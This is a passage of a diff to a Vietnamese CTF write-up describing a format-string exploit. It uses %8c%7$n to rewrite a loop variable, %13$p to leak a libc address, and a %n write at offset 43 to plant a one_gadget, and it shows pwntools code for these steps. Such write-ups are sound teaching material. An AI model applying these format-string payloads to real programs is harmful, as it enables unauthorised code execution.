@@ -74,17 +74,20 @@ thì các bước em khai thác như sau:
 ```
 
 - dùng %n trỏ đến vị trí thứ 43 đổi `0x007fffffffdcb8  →  0x007ffff7db5d90` thành one_gadget. okela
-___
+
+---
+
 # Thực thi
-Bước 1: ta sẽ tính toán để thay đổi v4,  nên là em sẽ ghi 8 vào vị trí thứ 7 là đã thay đổi giá trị v4  
+
+#### Bước 1: ta sẽ tính toán để thay đổi v4, nên là em sẽ ghi 8 vào vị trí thứ 7 là đã thay đổi giá trị v4  
 ![image](https://user-images.githubusercontent.com/111769169/224769758-d9f5f842-851b-479b-83e9-839ed89051a3.png)
 
-Đầu tiên do file ko có hàm system nên ta sẽ phải leak libc.
+#### Bước 2: do file ko có hàm system nên ta sẽ phải leak libc.
 Ta nên chọn vị trí 13 để leak vì nó là save rip của main và theo video 20 chú thích thì save rip nó tỉ lệ đúng hơn vì leak những thằng sau, khi chạy server nó là địa chỉ rác.
 
 ```python
-    # %8c%7$n là để thoả điều kiện chạy loop để có thể input nhiều lần, nó đọc 8 kí tự từ %c và ghi vào 
-    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p") 
+    # %8c%7$n là để thoả điều kiện chạy loop để có thể input nhiều lần, nó đọc 8 kí tự từ %c và ghi vào
+    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p")
     r.recvuntil(b"0x")
     leak = int(b"0x" + r.recvline(keepends=False), 16)
     libc.address = leak - 147587
